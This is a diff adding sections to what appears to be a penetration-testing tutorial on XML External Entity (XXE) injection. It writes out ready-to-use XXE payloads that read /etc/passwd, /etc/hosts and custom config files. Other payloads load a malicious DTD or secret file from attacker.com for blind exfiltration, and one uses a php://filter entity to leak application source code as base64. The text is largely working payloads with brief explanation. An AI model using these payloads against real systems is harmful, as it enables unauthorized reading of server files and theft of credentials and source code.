@@ -12,3 +12,60 @@ In this case data is being sent in the XML, so we can change it and test differe
 
 <img width="1260" height="574" alt="image" src="https://github.com/user-attachments/assets/3ebb3012-cd2e-4b78-8d9b-fa696d185ca3" />
 
+### 2) Reading sensitive files
+
+Consider that in certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.
+
+#### /etc/passwd
+
+    <?xml version="1.0" encoding="ISO-8859-1"?>
+    <!DOCTYPE foo [
+       <!ELEMENT foo ANY >
+       <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+    <foo>&xxe;</foo>
+
+#### Read a custom file
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE config [
+       <!ELEMENT config ANY >
+       <!ENTITY readConfig SYSTEM "file:///etc/myconfig.conf" >]>
+    <config>&readConfig;</config>
+
+#### Accessing local files
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE data [
+       <!ELEMENT data ANY >
+       <!ENTITY localHosts SYSTEM "file:///etc/hosts" >]>
+    <data>&localHosts;</data>
+
+#### Blind XXE
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE request [
+       <!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd">
+       <!ENTITY % all "<!ENTITY send SYSTEM 'file:///etc/passwd'>">
+       %remote;
+       %all;
+    ]>
+    <request>&send;</request>
+
+#### XXE with Network Access
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE request [
+       <!ELEMENT request ANY >
+       <!ENTITY xxe SYSTEM "http://attacker.com/secret.txt" >]>
+    <request>&xxe;</request>
+
+### 3) Read Source Code
+
+In this case we need to be careful because if we are referencing something that is not in proper XML format the External XML Entity vulnerability will not work, this can happens if the file contains XML special characters (eg. | < > { } &); for these cases we could base64 encode them. 
+
+    <!DOCTYPE email [
+      <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+    ]>
+
+<img width="1536" height="317" alt="image" src="https://github.com/user-attachments/assets/2e968743-a66a-47fe-9bf6-d90f03c2a9ca" />
+
